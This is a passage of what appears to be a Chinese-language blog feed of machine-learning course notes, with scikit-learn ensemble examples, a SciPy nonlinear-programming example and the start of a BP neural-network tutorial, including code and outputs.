class="keyword">from</span> sklearn.ensemble <span class="keyword">import</span> RandomForestClassifier</span><br><span class="line"><span class="keyword">from</span> sklearn.tree <span class="keyword">import</span> DecisionTreeClassifier</span><br><span class="line"></span><br><span class="line">n_samples = <span class="number">2000</span></span><br><span class="line">X_train, y_train=make_moons(n_samples=n_samples, noise=<span class="number">.3</span>,random_state=<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">ada_clf = RandomForestClassifier(n_estimators=<span class="number">500</span>,max_leaf_nodes=<span class="number">16</span>,n_jobs=-<span class="number">1</span>)</span><br><span class="line">ada_clf.fit(X_train[<span class="number">0</span>:<span class="number">1500</span>], y_train[<span class="number">0</span>:<span class="number">1500</span>])</span><br><span class="line">y_pred = ada_clf.predict(X_train[<span class="number">1500</span>:])</span><br><span class="line"><span class="built_in">print</span>(accuracy_score(y_train[<span class="number">1500</span>:], y_pred))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">plt.figure();</span><br><span class="line">plt.scatter(X_train[:,<span class="number">0</span>],X_train[:,<span class="number">1</span>],c=y_train)</span><br><span class="line">plt.show()</span><br><span class="line"></span><br></pre></td></tr></table></figure><pre><code>0.904</code></pre><p><img "" class="lazyload placeholder" data-original="output_1_1.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#Boost</span></span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">from</span> sklearn.datasets <span class="keyword">import</span> make_moons</span><br><span class="line"><span class="keyword">from</span> sklearn.metrics <span class="keyword">import</span> accuracy_score</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">from</span> sklearn.ensemble <span class="keyword">import</span> AdaBoostClassifier</span><br><span class="line"><span class="keyword">from</span> sklearn.tree <span class="keyword">import</span> DecisionTreeClassifier</span><br><span class="line"></span><br><span class="line">n_samples = <span class="number">2000</span></span><br><span class="line">X_train, y_train=make_moons(n_samples=n_samples, noise=<span class="number">.3</span>,random_state=<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">ada_clf = AdaBoostClassifier(</span><br><span class="line">DecisionTreeClassifier(max_depth=<span class="number">1</span>), n_estimators=<span class="number">500</span>,</span><br><span class="line">algorithm=<span class="string">&quot;SAMME.R&quot;</span>, learning_rate=<span class="number">0.5</span></span><br><span class="line">)</span><br><span class="line">ada_clf.fit(X_train[<span class="number">0</span>:<span class="number">1500</span>], y_train[<span class="number">0</span>:<span class="number">1500</span>])</span><br><span class="line">y_pred = ada_clf.predict(X_train[<span class="number">1500</span>:])</span><br><span class="line"><span class="built_in">print</span>(accuracy_score(y_train[<span class="number">1500</span>:], y_pred))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">plt.figure();</span><br><span class="line">plt.scatter(X_train[:,<span class="number">0</span>],X_train[:,<span class="number">1</span>],c=y_train)</span><br><span class="line">plt.show()</span><br><span class="line"></span><br></pre></td></tr></table></figure><pre><code>0.892</code></pre><p><img "" class="lazyload placeholder" data-original="output_2_1.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#Stacking</span></span><br><span class="line"><span class="keyword">from</span> sklearn <span class="keyword">import</span> datasets</span><br><span class="line"><span class="keyword">from</span> sklearn <span class="keyword">import</span> model_selection</span><br><span class="line"><span class="keyword">from</span> sklearn.linear_model <span class="keyword">import</span> LogisticRegression</span><br><span class="line"><span class="keyword">from</span> sklearn.neighbors <span class="keyword">import</span> KNeighborsClassifier</span><br><span class="line"><span class="keyword">from</span> sklearn.naive_bayes <span class="keyword">import</span> GaussianNB</span><br><span class="line"><span class="keyword">from</span> sklearn.ensemble <span class="keyword">import</span> RandomForestClassifier</span><br><span class="line"><span class="keyword">from</span> mlxtend.classifier <span class="keyword">import</span> StackingClassifier</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">iris = datasets.load_iris()</span><br><span class="line">X, y = iris.data[:, <span class="number">1</span>:<span class="number">3</span>], iris.target</span><br><span class="line"></span><br><span class="line">clf1 = KNeighborsClassifier(n_neighbors=<span class="number">1</span>)</span><br><span class="line">clf2 = RandomForestClassifier(random_state=<span class="number">1</span>)</span><br><span class="line">clf3 = GaussianNB()</span><br><span class="line">lr = LogisticRegression()</span><br><span class="line">sclf = StackingClassifier(classifiers=[clf1, clf2, clf3], meta_classifier=lr)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;3-fold cross validation:\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> clf, label <span class="keyword">in</span> <span class="built_in">zip</span>(</span><br><span class="line">    [clf1, clf2, clf3, sclf],</span><br><span class="line">    [<span class="string">&#x27;KNN&#x27;</span>, <span class="string">&#x27;Random Forest&#x27;</span>, <span class="string">&#x27;Naive Bayes&#x27;</span>, <span class="string">&#x27;StackingClassifier&#x27;</span>]):</span><br><span class="line"></span><br><span class="line">    scores = model_selection.cross_val_score(clf, X, y, cv=<span class="number">3</span>, scoring=<span class="string">&#x27;accuracy&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Accuracy: %0.2f (+/- %0.2f) [%s]&quot;</span> % (scores.mean(), scores.std(), label))</span><br><span class="line"></span><br></pre></td></tr></table></figure><pre><code>---------------------------------------------------------------------------ModuleNotFoundError                       Traceback (most recent call last)&lt;ipython-input-4-483486e68139&gt; in &lt;module&gt;      6 from sklearn.naive_bayes import GaussianNB      7 from sklearn.ensemble import RandomForestClassifier----&gt; 8 from mlxtend.classifier import StackingClassifier      9 import numpy as np     10 ModuleNotFoundError: No module named 'mlxtend'</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!pip install mlxtend</span><br></pre></td></tr></table></figure><pre><code>Looking in indexes: http://mirrors.aliyun.com/pypi/simple/ERROR: Could not find a version that satisfies the requirement mlxtend (from versions: none)ERROR: No matching distribution found for mlxtend</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#Voting</span></span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">from</span> sklearn.datasets <span class="keyword">import</span> make_moons<span class="comment">#生成月牙形数据</span></span><br><span class="line"><span class="keyword">from</span> sklearn.metrics <span class="keyword">import</span> accuracy_score<span class="comment">#分类器的准确率</span></span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt<span class="comment">#画图</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> sklearn.ensemble <span class="keyword">import</span> VotingClassifier<span class="comment">#调用集成学习的投票分类器</span></span><br><span class="line"><span class="keyword">from</span> sklearn.linear_model <span class="keyword">import</span> LogisticRegression<span class="comment">#调用逻辑回归分类器</span></span><br><span class="line"><span class="keyword">from</span> sklearn.svm <span class="keyword">import</span> SVC<span class="comment">#调用支持向量机分类器</span></span><br><span class="line"><span class="keyword">from</span> sklearn.neighbors <span class="keyword">import</span> KNeighborsClassifier<span class="comment">#调用KNN分类器</span></span><br><span class="line"></span><br><span class="line">n_samples = <span class="number">2000</span></span><br><span class="line">X_train, y_train=make_moons(n_samples=n_samples, noise=<span class="number">.3</span>,random_state=<span class="number">8</span>)</span><br><span class="line"><span class="comment">#shuffle_index=np.random.permutation(2000)</span></span><br><span class="line"></span><br><span class="line">log_clf = LogisticRegression()</span><br><span class="line">svm_clf = SVC()</span><br><span class="line">knn_clf=KNeighborsClassifier()</span><br><span class="line"></span><br><span class="line">voting_clf = VotingClassifier(</span><br><span class="line">estimators=[(<span class="string">&#x27;lr&#x27;</span>, log_clf),(<span class="string">&#x27;svc&#x27;</span>, svm_clf),(<span class="string">&#x27;knn&#x27;</span>,knn_clf)],</span><br><span class="line">voting=<span class="string">&#x27;hard&#x27;</span></span><br><span class="line">)</span><br><span class="line"><span class="comment">#voting_clf.fit(X_train[0:1500], y_train[0:1500])</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> clf <span class="keyword">in</span> (log_clf,svm_clf,knn_clf,voting_clf):</span><br><span class="line">    clf.fit(X_train[<span class="number">0</span>:<span class="number">1500</span>], y_train[<span class="number">0</span>:<span class="number">1500</span>])</span><br><span class="line">    y_pred = clf.predict(X_train[<span class="number">1500</span>:])</span><br><span class="line">    <span class="built_in">print</span>(clf.__class__.__name__, accuracy_score(y_train[<span class="number">1500</span>:], y_pred))</span><br><span class="line"></span><br><span class="line">plt.figure();</span><br><span class="line">plt.scatter(X_train[:,<span class="number">0</span>],X_train[:,<span class="number">1</span>],c=y_train)</span><br><span class="line">plt.show()</span><br><span class="line"></span><br></pre></td></tr></table></figure><pre><code>LogisticRegression 0.862SVC 0.906KNeighborsClassifier 0.902VotingClassifier 0.91</code></pre><p><img "" class="lazyload placeholder" data-original="output_5_1.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 机器学习课程(魏) </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 机器学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>非线性规划</title>
      <link href="/2021/11/08/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E8%AF%BE%E7%A8%8B(%E9%AD%8F)/%E9%9D%9E%E7%BA%BF%E6%80%A7%E8%A7%84%E5%88%92/"/>
      <url>/2021/11/08/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E8%AF%BE%E7%A8%8B(%E9%AD%8F)/%E9%9D%9E%E7%BA%BF%E6%80%A7%E8%A7%84%E5%88%92/</url>
      
        <content type="html"><![CDATA[<p><img "" class="lazyload placeholder" data-original="image-20211208163755018.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image-20211208163755018"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">minimize</span>(<span class="params">fun: <span class="type">Callable</span>,</span></span></span><br><span class="line"><span class="params"><span class="function">             x0: ndarray,</span></span></span><br><span class="line"><span class="params"><span class="function">             args: <span class="type">Union</span>[Iterable, <span class="built_in">tuple</span>, <span class="literal">None</span>] = (<span class="params"></span>),</span></span></span><br><span class="line"><span class="params"><span class="function">             method: <span class="type">Union</span>[<span class="built_in">str</span>, <span class="type">Callable</span>, <span class="literal">None</span>] = <span class="literal">None</span>,</span></span></span><br><span class="line"><span class="params"><span class="function">             jac: <span class="type">Union</span>[<span class="type">Callable</span>, <span class="built_in">str</span>, <span class="built_in">bool</span>, <span class="literal">None</span>] = <span class="literal">None</span>,</span></span></span><br><span class="line"><span class="params"><span class="function">             hess: <span class="built_in">str</span> = <span class="literal">None</span>,</span></span></span><br><span class="line"><span class="params"><span class="function">             hessp: <span class="type">Optional</span>[<span class="type">Callable</span>] = <span class="literal">None</span>,</span></span></span><br><span class="line"><span class="params"><span class="function">             bounds: <span class="type">Union</span>[Iterable, Bounds, <span class="literal">None</span>] = <span class="literal">None</span>,</span></span></span><br><span class="line"><span class="params"><span class="function">             constraints: <span class="type">Optional</span>[<span class="built_in">dict</span>] = (<span class="params"></span>),</span></span></span><br><span class="line"><span class="params"><span class="function">             tol: <span class="type">Optional</span>[<span class="built_in">float</span>] = <span class="literal">None</span>,</span></span></span><br><span class="line"><span class="params"><span class="function">             callback: <span class="type">Optional</span>[<span class="type">Callable</span>] = <span class="literal">None</span>,</span></span></span><br><span class="line"><span class="params"><span class="function">             options: <span class="type">Optional</span>[<span class="built_in">dict</span>] = <span class="literal">None</span></span>) -&gt; <span class="type">Any</span></span></span><br><span class="line"><span class="function">#Minimization of scalar function of one <span class="keyword">or</span> more variables.</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> scipy <span class="keyword">import</span>  optimize <span class="keyword">as</span> opt</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">from</span> scipy.optimize <span class="keyword">import</span> minimize</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 目标函数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">objective</span>(<span class="params">x</span>):</span></span><br><span class="line">    <span class="keyword">return</span> x[<span class="number">0</span>] ** <span class="number">2</span> + x[<span class="number">1</span>]**<span class="number">2</span> + x[<span class="number">2</span>]**<span class="number">2</span> +<span class="number">8</span></span><br><span class="line"><span class="comment"># 约束条件，&gt;=以及=</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">constraint1</span>(<span class="params">x</span>):</span></span><br><span class="line">    <span class="keyword">return</span> x[<span class="number">0</span>] ** <span class="number">2</span> - x[<span class="number">1</span>] + x[<span class="number">2</span>]**<span class="number">2</span>  <span class="comment"># 不等约束</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">constraint2</span>(<span class="params">x</span>):</span></span><br><span class="line">    <span class="keyword">return</span> -(x[<span class="number">0</span>] + x[<span class="number">1</span>]**<span class="number">2</span> + x[<span class="number">2</span>]**<span class="number">2</span>-<span class="number">20</span>)  <span class="comment"># 不等约束，默认&gt;=，这里是&lt;=,加上负号</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">constraint3</span>(<span class="params">x</span>):</span></span><br><span class="line">    <span class="keyword">return</span> -x[<span class="number">0</span>] - x[<span class="number">1</span>]**<span class="number">2</span> + <span class="number">2</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">constraint4</span>(<span class="params">x</span>):</span></span><br><span class="line">    <span class="keyword">return</span> x[<span class="number">1</span>] + <span class="number">2</span>*x[<span class="number">2</span>]**<span class="number">2</span> -<span class="number">3</span>           <span class="comment"># 不等约束</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 边界约束，都大于零</span></span><br><span class="line">b = (<span class="number">0.0</span>, <span class="literal">None</span>)</span><br><span class="line">bnds = (b, b ,b) </span><br><span class="line"></span><br><span class="line">con1 = &#123;<span class="string">&#x27;type&#x27;</span>: <span class="string">&#x27;ineq&#x27;</span>, <span class="string">&#x27;fun&#x27;</span>: constraint1&#125;<span class="comment">#不等约束&gt;=</span></span><br><span class="line">con2 = &#123;<span class="string">&#x27;type&#x27;</span>: <span class="string">&#x27;ineq&#x27;</span>, <span class="string">&#x27;fun&#x27;</span>: constraint2&#125;<span class="comment">#不等约束&gt;=</span></span><br><span class="line">con3 = &#123;<span class="string">&#x27;type&#x27;</span>: <span class="string">&#x27;eq&#x27;</span>, <span class="string">&#x27;fun&#x27;</span>: constraint3&#125;<span class="comment">#相等约束</span></span><br><span class="line">con4 = &#123;<span class="string">&#x27;type&#x27;</span>: <span class="string">&#x27;eq&#x27;</span>, <span class="string">&#x27;fun&#x27;</span>: constraint4&#125;<span class="comment">#相等约束</span></span><br><span class="line"></span><br><span class="line">cons = ([con1, con2, con3,con4])  <span class="comment"># 4个约束条件</span></span><br><span class="line"><span class="comment"># 计算</span></span><br><span class="line"><span class="comment">#定义初始值</span></span><br><span class="line"><span class="comment">#x0 = ([0, 0, 0])</span></span><br><span class="line"><span class="comment">#使用函数minimize求解最小值，传入参数：objective目标函数，x0初始值，method使用QP问题解决方法，bounds取值范围，constraints约束套件</span></span><br><span class="line">solution = minimize(objective, x0, method=<span class="string">&#x27;SLSQP&#x27;</span>, bounds=bnds, constraints=cons)</span><br><span class="line">x = solution.x</span><br><span class="line"><span class="built_in">print</span>(solution)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;目标值: &#x27;</span> + <span class="built_in">str</span>(objective(x)))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;答案为&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;x1 = &#x27;</span> + <span class="built_in">str</span>(x[<span class="number">0</span>]))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;x2 = &#x27;</span> + <span class="built_in">str</span>(x[<span class="number">1</span>]))</span><br></pre></td></tr></table></figure><pre><code>     fun: 10.651091840572583     jac: array([1.10433471, 2.40651834, 1.89564812]) message: 'Optimization terminated successfully'    nfev: 71     nit: 15    njev: 15  status: 0 success: True       x: array([0.55216734, 1.20325918, 0.94782404])目标值: 10.651091840572583答案为x1 = 0.5521673412903173x2 = 1.203259181851855</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 机器学习课程(魏) </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 机器学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>基于BP神经网络的预测</title>
      <link href="/2021/11/08/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/%E5%A4%A9%E6%B1%A0/%E5%9F%BA%E4%BA%8EBP%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E7%9A%84%E9%A2%84%E6%B5%8B/"/>
      <url>/2021/11/08/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/%E5%A4%A9%E6%B1%A0/%E5%9F%BA%E4%BA%8EBP%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E7%9A%84%E9%A2%84%E6%B5%8B/</url>
      
        <content type="html"><![CDATA[<h1 id="机器学习算法八基于bp神经网络的预测"><a class="markdownIt-Anchor" href="#机器学习算法八基于bp神经网络的预测">#</a> 机器学习算法（八）：基于 BP 神经网络的预测 ¶</h1><h2 id="1前言算法简介和应用"><a class="markdownIt-Anchor" href="#1前言算法简介和应用">#</a> 1. 前言：算法简介和应用</h2><h3 id="11算法简介"><a class="markdownIt-Anchor" href="#11算法简介">#</a> 1.1. 算法简介</h3><p>BP（Back Propagation）网络是 1986 年由 Rumelhart 和 McCelland 为首的科学家小组提出，是一种按误差逆传播算法训练的多层前馈网络，是目前应用最广泛的神经网络模型之一。BP 网络能学习和存贮大量的输入 - 输出模式映射关系，而无需事前揭示描述这种映射关系的数学方程。它的学习规则是使用最速下降法，通过反向传播来不断调整网络的权值和阈值，使网络的误差平方和最小。BP 神经网络模型拓扑结构包括输入层（input）、隐层 (hide layer) 和输出层 (output layer)。在模拟过程中收集系统所产生的误差，通过误差反传，然后调整权值大小，通过该不断迭代更新，最后使得模型趋于整体最优化（这是一个循环，我们在训练神经网络的时候是要不断的去重复这个过程的）。</p><p>BP 神经网络具有以下优点：</p><ol><li><p>非线性映射能力：BP 神经网络实质上实现了一个从输入到输出的映射功能，数学理论证明三层的神经网络就能够以任意精度逼近任何非线性连续函数。这使得其特别适合于求解内部机制复杂的问题，即 BP 神经网络具有较强的非线性映射能力。</p></li><li><p>自学习和自适应能力：BP 神经网络在训练时，能够通过学习自动提取输入、输出数据间的 “合理规则”，并自适应地将学习内容记忆于网络的权值中。即 BP 神经网络具有高度自学习和自适应的能力。</p></li><li><p>泛化能力：所谓泛化能力是指在设计模式分类器时，即要考虑网络在保证对所需分类对象进行正确分类，还要关心网络在经过训练后，能否对未见过的模式或有噪声污染的模式，进行正确的分类。也即 BP 神经网络具有将学习成果应用于新知识的能力。</p></li></ol><p>BP 神经网络具有以下缺点点：</p><ol><li><p>局部极小化问题：从数学角度看，传统的 BP 神经网络为一种局部搜索的优化方法，它要解决的是一个复杂非线性化问题，网络的权值是通过沿局部改善的方向逐渐进行调整的，这样会使算法陷入局部极值，权值收敛到局部极小点，从而导致网络训练失败。加上 BP 神经网络对初始网络权重非常敏感，以不同的权重初始化网络，其往往会收敛于不同的局部极小，这也是每次训练得到不同结果的根本原因。</p></li><li><p>BP 神经网络算法的收敛速度慢：由于 BP 神经网络算法本质上为梯度下降法，它所要优化的目标函数是非常复杂的，因此，必然会出现 “锯齿形现象”，这使得 BP 算法低效；又由于优化的目标函数很复杂，它必然会在神经元输出接近 0 或 1 的情况下，出现一些平坦区，在这些区域内，权值误差改变很小，使训练过程几乎停顿；BP 神经网络模型中，为了使网络执行 BP 算法，不能使用传统的一维搜索法求每次迭代的步长，而必须把步长的更新规则预先赋予网络，这种方法也会引起算法低效。以上种种，导致了 BP 神经网络算法收敛速度慢的现象。</p></li><li><p>BP 神经网络结构选择不一：BP 神经网络结构的选择至今尚无一种统一而完整的理论指导，一般只能由经验选定。网络结构选择过大，训练中效率不高，可能出现过拟合现象，造成网络性能低，容错性下降，若选择过小，则又会造成网络可能不收敛。而网络的结构直接影响网络的逼近能力及推广性质。因此，应用中如何选择合适的网络结构是一个重要的问题。</p></li></ol><h3 id="12算法应用"><a class="markdownIt-Anchor" href="#12算法应用">#</a> 1.2. 算法应用</h3><p>BP 反映了生物神经系统处理外界事物的基本过程，是在模拟人脑神经组织的基础上发展起来的计算系统，是由大量处理单元通过广泛互联而构成的网络体系，它具有生物神经系统的基本特征，在一定程度上反映了人脑功能的若干反映，是对生物系统的某种模拟，具有大规模并行、分布式处理、自组织、自学习等优点，被广泛应用于语音分析、图像识别、数字水印、计算机视觉等很多领域，取得了许多突出的成果。最近由于人工神经网络的快速发展，它已经成为模式识别的强有力的工具。神经网络的运用展开了新的领域，解决其它模式识别不能解决的问题，其分类功能特别适合于模式识别与分类的应用。</p><h2 id="2学习目标"><a class="markdownIt-Anchor" href="#2学习目标">#</a> 2. 学习目标</h2><p>掌握 BP 算法基本原理<br>掌握利用 BP 进行代码实战</p><h2 id="3代码流程"><a class="markdownIt-Anchor" href="#3代码流程">#</a> 3. 代码流程</h2><p><strong>Part 1 Demo 实践</strong></p><ul><li><p>Step1: 库函数导入</p></li><li><p>Step2: 模型训练</p></li><li><p>Step3: 模型参数查看</p></li><li><p>Step4: 数据和模型可视化</p></li><li><p>Step5: 模型预测<br><strong> Part 2 基于 BP 神经网络的乳腺癌分类实践</strong></p></li><li><p>Step1: 库函数导入</p></li><li><p>Step2: 数据读取 / 载入</p></li><li><p>Step3: 数据信息简单查看与可视化</p></li><li><p>Step4: 利用 BP 神经网络在乳腺癌数据上进行训练和预测</p></li></ul><h2 id="4代码实战"><a class="markdownIt-Anchor" href="#4代码实战">#</a> 4. 代码实战</h2><h4 id="part-1-demo实践"><a class="markdownIt-Anchor" href="#part-1-demo实践">#</a> <strong>Part 1 Demo 实践</strong></h4><p><strong>Step1: 库函数导入</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 基础数组运算库导入</span></span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np </span><br><span class="line"><span class="comment"># 画图库导入</span></span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt </span><br><span class="line"><span class="comment"># 导入三维显示工具</span></span><br><span class="line"><span class="keyword">from</span> mpl_toolkits.mplot3d <span class="keyword">import</span> Axes3D</span><br><span class="line"><span class="comment"># 导入BP模型</span></span><br><span class="line"><span class="keyword">from</span> sklearn.neural_network <span class="keyword">import</span> MLPClassifier</span><br><span class="line"><span class="comment"># 导入demo数据制作方法</span></span><br><span class="line"><span class="keyword">from</span> sklearn.datasets <span class="keyword">import</span> make_classification</span><br><span class="line"><span class="keyword">from</span> sklearn.metrics <span class="keyword">import</span> classification_report, confusion_matrix</span><br><span class="line"><span class="keyword">import</span> seaborn <span class="keyword">as</span> sns</span><br><span class="line"><span class="keyword">import</span> warnings</span><br><span class="line"><span class="keyword">from</span> sklearn.exceptions <span class="keyword">import</span> ConvergenceWarning</span><br></pre></td></tr></table></figure><p><strong>Step2: 模型训练</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 制作五个类别的数据，每个类别1000个样本</span></span><br><span class="line">train_samples, train_labels = make_classification(n_samples=<span class="number">1000</span>, n_features=<span class="number">3</span>, n_redundant=<span class="number">0</span>,</span><br><span class="line">                           n_classes=<span class="number">5</span>, n_informative=<span class="number">3</span>, n_clusters_per_class=<span class="number">1</span>,</span><br><span class="line">                           class_sep=<span class="number">3</span>, random_state=<span class="number">10</span>)</span><br><span class="line"><span class="comment"># 将五个类别的数据进行三维显示</span></span><br><span class="line">fig = plt.figure()</span><br><span class="line">ax = Axes3D(fig, rect=[<span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>], elev=<span class="number">20</span>, azim=<span class="number">20</span>)</span><br><span class="line">ax.scatter(train_samples[:, <span class="number">0</span>], train_samples[:, <span class="number">1</span>], train_samples[:, <span class="number">2</span>], marker=<span class="string">&#x27;o&#x27;</span>, c=train_labels)</span><br><span class="line">plt.title(<span class="string">&#x27;Demo Data Map&#x27;</span>)</span><br></pre></td></tr></table></figure><pre><code>c:\users\administrator\appdata\local\programs\python\python37\lib\site-packages\ipykernel_launcher.py:7: MatplotlibDeprecationWarning: Axes3D(fig) adding itself to the figure is deprecated since 3.4. Pass the keyword argument auto_add_to_figure=False and use fig.add_axes(ax) to suppress this warning. The default value of auto_add_to_figure will change to False in mpl3.5 and True values will no longer work in 3.6.  This is consistent with other Axes classes.  import sysText(0.5, 0.92, 'Demo Data Map')</code></pre><p>​<br><img "" class="lazyload placeholder" data-original="output_3_2.png" 